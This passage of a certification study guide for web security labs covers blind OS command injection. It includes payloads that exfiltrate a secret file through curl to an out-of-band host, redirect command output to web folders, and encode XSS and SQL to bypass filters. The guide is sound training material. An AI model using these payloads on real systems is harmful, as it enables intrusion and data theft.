2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eUse following command separation characters to \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e Operating System Command injection vulnerabilities.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\" \u0026amp;\u0026amp;\n \u0026amp;\n ||\n |\n ;\n `\n '\n \u0026quot;\n 0x0a\n \\n\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e \u0026amp;\u0026amp;\n \u0026amp;\n ||\n |\n ;\n `\n '\n \"\n 0x0a\n \\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe target application \u003cstrong\u003esubmit feedback\u003c/strong\u003e function require email value, and \u003cem\u003e\u003cstrong\u003eidentifying\u003c/strong\u003e\u003c/em\u003e blind OS command injection by appending \u003ccode\u003e||curl OASTIFY.COM||\u003c/code\u003e bash command, we then can observe a request made to Collaborator.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"email=carlos@exam.net||curl+`whoami`.OASTIFY.COM||\"\u003e\u003cpre\u003eemail=carlos@exam.net\u003cspan class=\"pl-k\"\u003e||\u003c/span\u003ecurl+\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e`\u003c/span\u003ewhoami\u003cspan class=\"pl-pds\"\u003e`\u003c/span\u003e\u003c/span\u003e.OASTIFY.COM\u003cspan class=\"pl-k\"\u003e||\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe below payload use DNS exfiltration and the Burp Collaborator DNS service.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"||$(curl $(cat /home/carlos/secret).OASTIFY.COM)||\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e||$(curl $(cat /home/carlos/secret).OASTIFY.COM)||\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIn this YouTube video \u003ca href=\"https://youtu.be/o7oVWXw4t5E\" rel=\"nofollow\"\u003eLeet Cipher\u003c/a\u003e show how to use DNS rebinding with blind command injection to exfiltration the contents of \u003ccode\u003epasswd\u003c/code\u003e from the target by first uploading bash script that Base64 and then Base58 encode the \u003ccode\u003epasswd\u003c/code\u003e file content, to strip special character not able to ex-filtrate with DNS label restrictions.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/os-command-inject.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/os-command-inject.png\" alt=\"OS command injection\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://github.com/leetCipher/bug-bounty-labs/tree/main/dns-exfiltration-lab/poc\"\u003eleetCipher Github scripts for Blind OS DNS exfiltrate\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003ePortSwigger Lab payload perform a DNS lookup using \u003ccode\u003enslookup\u003c/code\u003e as a Burp Collaborator subdomain.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"email=peanut2019@nuts.net||nslookup+`whoami`.OASTIFY.COM||\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eemail=peanut2019@nuts.net||nslookup+`whoami`.OASTIFY.COM||\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration\" rel=\"nofollow\"\u003ePortSwigger Lab: Blind OS command injection with out-of-band data exfiltration\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eOutput redirection\u003c/h3\u003e\u003ca id=\"user-content-output-redirection\" class=\"anchor\" aria-label=\"Permalink: Output redirection\" href=\"#output-redirection\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIf OS command injection \u003cem\u003e\u003cstrong\u003eidentified\u003c/strong\u003e\u003c/em\u003e, and filter in place preventing complex command injection, attempt to redirect output to writable folder. \u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e a \u003ca href=\"#file-path-traversal\"\u003epath traversal\u003c/a\u003e vulnerability that allow reading of files only in current WEB APP.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e the working directory using \u003ccode\u003epwd\u003c/code\u003e command output redirected, and appending to \u003ccode\u003eoutput.txt\u003c/code\u003e file every bash command stdout.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"||pwd\u0026gt;output.txt||\n||echo\u0026gt;\u0026gt;output.txt||\n||cat+/etc/hosts\u0026gt;\u0026gt;/var/www/images/output.txt||\n||echo\u0026gt;\u0026gt;output.txt||\n||ls+-al\u0026gt;\u0026gt;/var/www/images/output.txt||\n||echo\u0026gt;\u0026gt;output.txt||\n||whoami\u0026gt;\u0026gt;/var/www/images/output.txt||\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e||pwd\u0026gt;output.txt||\n||echo\u0026gt;\u0026gt;output.txt||\n||cat+/etc/hosts\u0026gt;\u0026gt;/var/www/images/output.txt||\n||echo\u0026gt;\u0026gt;output.txt||\n||ls+-al\u0026gt;\u0026gt;/var/www/images/output.txt||\n||echo\u0026gt;\u0026gt;output.txt||\n||whoami\u0026gt;\u0026gt;/var/www/images/output.txt||\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eUse working directory discovered using above \u003ccode\u003epwd\u003c/code\u003e command to redirect output and read content.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/os-cmd-path-traversal-lfi.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/os-cmd-path-traversal-lfi.png\" alt=\"os CMD path traversal lfi\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eGet output file content.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"GET /image?filename=output.txt HTTP/2\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eGET /image?filename=output.txt HTTP/2\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection\" rel=\"nofollow\"\u003ePortSwigger Lab: Blind OS command injection with output redirection\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSample Command Injection Basic Payloads:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"; sleep 5\n| ping -c 5 exploit.net\n`ls`\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e sleep 5\n\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e ping -c 5 exploit.net\n\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e`\u003c/span\u003els\u003cspan class=\"pl-pds\"\u003e`\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTip from \u003cem\u003e\u003cstrong\u003efullfox\u003c/strong\u003e\u003c/em\u003e:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eIf you can inject in an XML file and you can't find a way to perform an XXE, think about OS command injection using $() or backticks.\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch1 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eAppendix\u003c/h1\u003e\u003ca id=\"user-content-appendix\" class=\"anchor\" aria-label=\"Permalink: Appendix\" href=\"#appendix\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThis section contain \u003cstrong\u003eadditional\u003c/strong\u003e information to solving the PortSwigger labs and approaching the BSCP exam, such as the Youtube content creators, Burp speed scanning technique, python scripts and \u003ca href=\"#obfuscation\"\u003eObfuscation\u003c/a\u003e techniques to bypass filters.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#obfuscation\"\u003eObfuscation\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#python-scripts\"\u003ePython Scripts\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#focus-scanning\"\u003eFocus Scanning\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#approach\"\u003eApproach\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#extra-training-content\"\u003eYouTube \u0026amp; Extra Training Content\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"https://www.epochconverter.com/\" rel=\"nofollow\"\u003eConvert epoch time to milliseconds from human readable may be in exam\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eObfuscation\u003c/h2\u003e\u003ca id=\"user-content-obfuscation\" class=\"anchor\" aria-label=\"Permalink: Obfuscation\" href=\"#obfuscation\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eObfuscation is the action of making something obscure, unclear, or unintelligible.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eURL and Base64 online encoders and decoders.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ca href=\"https://www.urldecoder.org/\" rel=\"nofollow\"\u003eURL Decode and Encode\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.base64encode.org/\" rel=\"nofollow\"\u003eBASE64 Decode and Encode\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eURL replacing the period character \u003ccode\u003e.\u003c/code\u003e with encoded value of \u003ccode\u003e%2e\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eDouble-encode the injecting payload.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"/?search=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e/?search=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eHTML encode one or more of the characters. In video by \u003ca href=\"https://youtu.be/-4ia_L-uLGY\" rel=\"nofollow\"\u003ez3nsh3ll: Payload obfuscation with HTML encoding\u003c/a\u003e he explain post analysis of the lab Stored XSS into \u003ccode\u003eonclick\u003c/code\u003e event.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;img src=x onerror=\u0026quot;\u0026amp;#x61;lert(1)\u0026quot;\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eimg\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003ex\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eonerror\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003e\u0026amp;#x61;lert(1)\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eXML encode for bypassing WAFs\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-xml notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;stockCheck\u0026gt;\n    \u0026lt;productId\u0026gt;\n        123\n    \u0026lt;/productId\u0026gt;\n    \u0026lt;storeId\u0026gt;\n         999 \u0026amp;#x53;ELECT * FROM information_schema.tables\n    \u0026lt;/storeId\u0026gt;\n\u0026lt;/stockCheck\u0026gt;\"\u003e\u003cpre\u003e\u0026lt;\u003cspan class=\"pl-ent\"\u003estockCheck\u003c/span\u003e\u0026gt;\n    \u0026lt;\u003cspan class=\"pl-ent\"\u003eproductId\u003c/span\u003e\u0026gt;\n        123\n    \u0026lt;/\u003cspan class=\"pl-ent\"\u003eproductId\u003c/span\u003e\u0026gt;\n    \u0026lt;\u003cspan class=\"pl-ent\"\u003estoreId\u003c/span\u003e\u0026gt;\n         999 \u003cspan class=\"pl-c1\"\u003e\u0026amp;#x53;\u003c/span\u003eELECT * FROM information_schema.tables\n    \u0026lt;/\u003cspan class=\"pl-ent\"\u003estoreId\u003c/span\u003e\u0026gt;\n\u0026lt;/\u003cspan class=\"pl-ent\"\u003estockCheck\u003c/span\u003e\u0026gt;\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eMultiple encodings together\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;a href=\u0026quot;javascript:\u0026amp;bsol;u0061lert(1)\u0026quot;\u0026gt;Click me\u0026lt;/a\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ea\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ehref\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ejavascript:\u0026amp;bsol;u0061lert(1)\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003eClick me\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ea\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSQL CHAR\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003eCHAR\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e83\u003c/span\u003e)\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-k\"\u003eCHAR\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e69\u003c/span\u003e)\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-k\"\u003eCHAR\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e76\u003c/span\u003e)\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-k\"\u003eCHAR\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e69\u003c/span\u003e)\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-k\"\u003eCHAR\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e67\u003c/span\u003e)\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-k\"\u003eCHAR\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e84\u003c/span\u003e)\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings\" rel=\"nofollow\"\u003eObfuscating attacks using encodings\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003ePython Scripts\u003c/h2\u003e\u003ca id=\"user-content-python-scripts\" class=\"anchor\" aria-label=\"Permalink: Python Scripts\" href=\"#python-scripts\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003ePython script to \u003cem\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/python/identify\"\u003eidentify\u003c/a\u003e\u003c/strong\u003e\u003c/em\u003e vulnerabilities in the exam and provide indicators of exploits.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/python/identify\"\u003ePython Script to \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e possible vulnerabilities in headers, cookies or the response body\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/python/README.md\"\u003eLab Automated Python Scripts\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/python\"\u003eAutomate the solving of the labs using python scripts\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eApproach\u003c/h2\u003e\u003ca id=\"user-content-approach\" class=\"anchor\" aria-label=\"Permalink: Approach\" href=\"#approach\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTips from \u003ca href=\"https://youtu.be/Lbn8zQJByGY?t=551\" rel=\"nofollow\"\u003eDaniel Redfern\u003c/a\u003e is best I have come access explaining fundamental mechanics in BSCP exam, especially Tip 7, only one active user per application and if you reach stage 2 and you did not use interactive exploit in stage 1 that required the \u003cstrong\u003eDeliver to Victim\u003c/strong\u003e function of the exploit server, then use an interactive exploit on stage 2 to reach admin user role.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://github.com/Hacking-Notes\"\u003eHacking-Notes\u003c/a\u003e created a awesome website with an interactive checklist to help people during BSCP exams.\u003cbr\u003e\nTrack phases of attacks checklist:\u003cbr\u003e\n\u003ca href=\"https://bscp.guide\" rel=\"nofollow\"\u003ehttps://bscp.guide\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eWhen stuck in BSCP exam, reference the below \u003ca href=\"https://micahvandeusen.com/burp-suite-certified-practitioner-exam-review/\" rel=\"nofollow\"\u003eMicah van Deusen blog tip 5 table of category to stages\u003c/a\u003e for ways to progress through the stages.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/MicahVanDeusens-blog.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/MicahVanDeusens-blog.png\" alt=\"MicahVanDeusens-blog\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eIdentified\u003c/h3\u003e\u003ca id=\"user-content-identified\" class=\"anchor\" aria-label=\"Permalink: Identified\" href=\"#identified\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe image below is my view of possible vulnerabilities \u003cem\u003e\u003cstrong\u003eidentified\u003c/strong\u003e\u003c/em\u003e and exploitation to reach the next BSCP exam stage and progress through the exam challenges.\u003cbr\u003e\nI have managed solve the challenges in green using the \u003ca href=\"https://portswigger.net/web-security/all-labs\" rel=\"nofollow\"\u003ePortSwigger Academy Labs\u003c/a\u003e, but we never stop learning......\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/extras\"\u003e\u003cimg src=\"https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/3stages.png\" alt=\"Passed BSCP Exam Stages\" style=\"height: 230px !important; width: 810px !important; max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eExtra Training Content\u003c/h2\u003e\u003ca id=\"user-content-extra-training-content\" class=\"anchor\" aria-label=\"Permalink: Extra Training Content\" href=\"#extra-training-content\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 